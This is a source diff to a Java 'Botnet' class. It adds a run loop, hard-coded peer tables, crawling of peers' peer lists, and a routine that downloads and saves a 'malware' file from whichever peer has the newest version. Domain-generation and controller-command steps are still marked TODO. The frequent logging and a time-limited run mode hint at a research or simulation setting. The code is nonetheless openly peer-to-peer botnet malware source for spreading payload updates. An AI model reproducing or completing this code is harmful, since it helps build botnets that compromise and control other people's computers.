@@ -15,9 +15,10 @@ import java.util.concurrent.TimeUnit;
 public class Botnet {
 	protected HashMap<Integer, Peer> proxiesTable = new HashMap<Integer, Peer>();
 	protected HashMap<Integer, Peer> peersTable = new HashMap<Integer, Peer>();
+	protected HashMap<Integer, Peer> hardCodedPeersTable = new HashMap<Integer, Peer>();
 	protected Peer myPeerInfo = null;
 
-	public String nextAction = null;
+	public String nextAction = "updatePeerList";
 	protected XMLHandler handle = null;
 	protected LogWriter log = null;
 	protected boolean isConfigured = false;
@@ -25,27 +26,29 @@ public class Botnet {
 	public Botnet() {
 		log = new LogWriter();
 		if (!initializeBot()) {
-			log.addLogEntry("An erro occurred on bot iniatialization, and it was terminaded");
+			log.addLogEntry("An erro occurred on bot initialization, and it was terminaded");
 			System.exit(1);
 		} else {
-			log.addLogEntry("Bot iniatialization fully completed");
+			log.addLogEntry("Bot initialization fully completed");
 		}
 	}
 
 	public Botnet(String aux) {
 		log = new LogWriter(aux);
 		if (!initializeBot(aux)) {
-			log.addLogEntry("An erro occurred on bot iniatialization, and it was terminaded");
+			log.addLogEntry("An erro occurred on bot initialization, and it was terminaded");
 			System.exit(1);
 		} else {
-			log.addLogEntry("Bot iniatialization fully completed");
+			log.addLogEntry("Bot initialization fully completed");
 		}
 	}
 
 	private boolean initializeBot(String aux) {
 		handle = new XMLHandler(log, aux);
 		myPeerInfo = handle.getMyPeerInfo();
-		peersTable = handle.getHardcodedPeerList();
+		log.addLogEntry("Opening connections");
+		openConnection();
+		hardCodedPeersTable = handle.getHardcodedPeerList();
 		proxiesTable = handle.getHardcodedProxyPeerList();
 		if (handle == null || myPeerInfo == null || peersTable == null
 				|| proxiesTable == null) {
@@ -65,7 +68,9 @@ public class Botnet {
 	private boolean initializeBot() {
 		handle = new XMLHandler(log);
 		myPeerInfo = handle.getMyPeerInfo();
-		peersTable = handle.getHardcodedPeerList();
+		log.addLogEntry("Opening connections");
+		openConnection();
+		hardCodedPeersTable = handle.getHardcodedPeerList();
 		proxiesTable = handle.getHardcodedProxyPeerList();
 		if (handle == null || myPeerInfo == null || peersTable == null
 				|| proxiesTable == null) {
@@ -79,10 +84,60 @@ public class Botnet {
 		return true;
 	}
 
+	public void run() {
+		while (true) {
+			log.addLogEntry("------------------------------");
+			log.addLogEntry("Running action: " + nextAction);
+			switch (nextAction) {
+			case "updatePeerList":
+				updatePeerList();
+				break;
+			case "DGAMode":
+				DGAMode();
+				break;
+			case "configuration":
+				configuration();
+				break;
+			case "timer":
+				timer();
+				break;
+			case "verificationRound":
+				verificationRound();
+				break;
+			}
+		}
+	}
+
+	public void run(int min) {
+		long start = System.currentTimeMillis();
+		long end = start + min * 60 * 1000; // 60 seconds * 1000 ms/sec
+		while (System.currentTimeMillis() < end) {
+			log.addLogEntry("------------------------------");
+			log.addLogEntry("Running action: " + nextAction);
+			switch (nextAction) {
+			case "updatePeerList":
+				updatePeerList();
+				break;
+			case "DGAMode":
+				DGAMode();
+				break;
+			case "configuration":
+				configuration();
+				break;
+			case "timer":
+				timer();
+				break;
+			case "verificationRound":
+				verificationRound();
+				break;
+			}
+		}
+	}
+
 	/*
 	 * open tcp and udp connections
 	 */
-	public boolean openConnection() {
+	private boolean openConnection() {
 		int port = myPeerInfo.port;
 		// open doors to other peers connect
 
@@ -96,57 +151,69 @@ public class Botnet {
 	/*
 	 * Generating domains TODO: not implemented yet
 	 */
-	public void DGAMode() {
+	private void DGAMode() {
 		nextAction = "timer";
 		return;
 	}
 
 	/*
-	 * get peer lists from neighbours for all hardcoded(or neighbors) nodes,
+	 * get peer lists from neighbours for all hard coded(or neighbors) nodes,
 	 * stops if we have 50 bots
 	 */
-	public boolean updatePeerList() {
+	private boolean updatePeerList() {
 
 		Queue<Peer> queue = new LinkedList<Peer>();
 		Set<Integer> visitedId = new HashSet<Integer>();
 
-		// check conncectivity with peersTable peers
-		Iterator<Map.Entry<Integer, Peer>> it = peersTable.entrySet()
-				.iterator();
+		// check connecectivity with peersTable peers
+		if (!peersTable.isEmpty()) {
+			Iterator<Map.Entry<Integer, Peer>> it = peersTable.entrySet()
+					.iterator();
 
-		while (it.hasNext()) {
-			Map.Entry<Integer, Peer> entry = it.next();
-			Peer peer = entry.getValue();
-			int id = entry.getKey();
-			visitedId.add(id);
-
-			if (peer.getVersion() != -1) {
-				queue.add(peer);
-			} else {
-				System.out.println("removing"+id+"!");
-				it.remove();
+			while (it.hasNext()) {
+				Map.Entry<Integer, Peer> entry = it.next();
+				Peer peer = entry.getValue();
+				int id = entry.getKey();
+				if (visitedId.add(id) && id != handle.getMyId()) {
+					if (peer.getVersion() != -1) {
+						log.addLogEntry("Peer "
+								+ id
+								+ " is responsive, add it to peers table and get peerList!");
+						queue.add(peer);
+					} else {
+						log.addLogEntry("Peer " + id
+								+ " is not responsive, remove it!");
+						it.remove();
+					}
+				}
 			}
 		}
 
 		// check conncectivity with hardcoded peers
-		for (Map.Entry<Integer, Peer> entry : handle.getHardcodedPeerList()
-				.entrySet()) {
+		for (Map.Entry<Integer, Peer> entry : hardCodedPeersTable.entrySet()) {
 			Peer peer = entry.getValue();
 			int id = entry.getKey();
 
-			if (visitedId.add(id) && id!= handle.getMyId()) {
+			if (visitedId.add(id) && id != handle.getMyId()) {
 				if (peer.getVersion() != -1) {
+					log.addLogEntry("Hard coded peer "
+							+ id
+							+ " is responsive, add it to peers table and get peerList!");
 					queue.add(peer);
 					peersTable.put(id, peer);
+				} else {
+					log.addLogEntry("Peer " + id
+							+ " is not responsive, remove it!");
 				}
 			}
 		}
+
 		// get peers from peerlists of peers
 		while (!queue.isEmpty()) {
-			
-			Peer peerAux = queue.remove();
-			System.out.println("queue"+peerAux.host+" "+peerAux.port);
 
+			Peer peerAux = queue.remove();
+			log.addLogEntry("Getting peerlist (" + peerAux.host + ", "
+					+ peerAux.port + ")");
 			HashMap<Integer, Peer> list = peerAux.getPeerList();
 
 			if (list == null)
@@ -155,9 +222,11 @@ public class Botnet {
 			for (Map.Entry<Integer, Peer> entry : list.entrySet()) {
 				Integer id = entry.getKey();
 				Peer peer = entry.getValue();
-				if (visitedId.add(id) && id!= handle.getMyId()) {
+				if (visitedId.add(id) && id != handle.getMyId()) {
 					if (peer.getVersion() != -1) {
 						queue.add(peer);
+						log.addLogEntry("Peer " + id
+								+ " is responsive, add it to get peerList!");
 						peersTable.put(id, peer);
 					}
 				}
@@ -170,6 +239,7 @@ public class Botnet {
 			nextAction = "DGAMode";
 			return true;
 		}
+		log.addLogEntry("Saving peer list to file");
 		// save list to file
 		String content = "<peerlist>\n";
 		for (Map.Entry<Integer, Peer> entry : peersTable.entrySet()) {
@@ -191,14 +261,19 @@ public class Botnet {
 	 * version among all its peer Neighbours. When the download it is complete,
 	 * the bot get info from it, e.g Server List, DGA alghoritms, temps
 	 */
-	public void configuration() {
+	private void configuration() {
 		if (!isConfigured) {
 			Peer mostUpdatedPeer = getMostUpdatedPeer();
 			if (mostUpdatedPeer != null) {
+				log.addLogEntry("Get by TCP request malware from host"
+						+ mostUpdatedPeer.host + " port: "
+						+ mostUpdatedPeer.port);
 				ByteArrayOutputStream baos;
 				baos = (ByteArrayOutputStream) mostUpdatedPeer.getFile();
 				handle.writeMalwareFile(baos);
 			}
+			log.addLogEntry("Post to Controller Comand");
+			log.addLogEntry("Configuring bot");
 			// TODO post to Controller Command
 			// TODO configure using info obtained from peer
 		}
@@ -213,26 +288,33 @@ public class Botnet {
 	 * reach, and this bot it is connected to the Internet then the peer must be
 	 * removed
 	 */
-	public Peer getMostUpdatedPeer() {
+	private Peer getMostUpdatedPeer() {
 		int newestVersion = handle.getVersion();
 		Peer mostUpdatedPeer = null;
+
 		for (Map.Entry<Integer, Peer> entry : peersTable.entrySet()) {
 			Integer id = entry.getKey();
 			Peer peer = entry.getValue();
+			log.addLogEntry("Checking connectivity with Peer " + id);
 			int peerVersion = peer.getVersion();
 			boolean isPeerReachable = false;
 
 			if (peerVersion == -1) {// not reachable
+				log.addLogEntry("Peer " + id + "could not be reached");
 				for (int i = 1; i <= 5; i++) {
+					log.addLogEntry(i + " try to connect");
 					peerVersion = peer.getVersion();
 					if (peerVersion != -1) {
 						isPeerReachable = true;
+						log.addLogEntry("Peer is back alive");
 						break;
 					}
 				}
 				if (!isPeerReachable) {
+					log.addLogEntry("Check if this bot is Online");
 					if (isInternetReachable()) {
 						peersTable.remove(id);
+						log.addLogEntry("bot is online, remove unresponsive peer");
 						continue;
 					} else {
 						mostUpdatedPeer = null;
@@ -241,7 +323,10 @@ public class Botnet {
 				}
 
 			} else {
-				if (newestVersion < peerVersion) {
+				log.addLogEntry("Peer " + id + " connected with version "
+						+ peerVersion);
+				if (newestVersion < peerVersion
+						&& handle.getVersion() < peerVersion) {
 					mostUpdatedPeer = peer;
 					newestVersion = peerVersion;
 				}
@@ -250,7 +335,7 @@ public class Botnet {
 		return mostUpdatedPeer;
 	}
 
-	public boolean isInternetReachable() {
+	private boolean isInternetReachable() {
 		try {
 			// make a URL to a known source
 			URL url = new URL("http://www.google.com");
@@ -273,7 +358,7 @@ public class Botnet {
 		return true;
 	}
 
-	public boolean timer() {
+	private boolean timer() {
 		try {
 			TimeUnit.MINUTES.sleep(1);// TODO:change to 30 minutes
 		} catch (InterruptedException ex) {
@@ -288,12 +373,16 @@ public class Botnet {
 		return true;
 	}
 
-	public boolean verificationRound() {
+	private boolean verificationRound() {
 		Peer mostUpdatedPeer = getMostUpdatedPeer();
 		if (mostUpdatedPeer != null) {
+			log.addLogEntry("Get by TCP request malware from host"
+					+ mostUpdatedPeer.host + " port: " + mostUpdatedPeer.port);
 			ByteArrayOutputStream baos;
 			baos = (ByteArrayOutputStream) mostUpdatedPeer.getFile();
 			handle.writeMalwareFile(baos);
+		} else {
+			log.addLogEntry("Bot up to date");
 		}
 		nextAction = "timer";
 		return true;
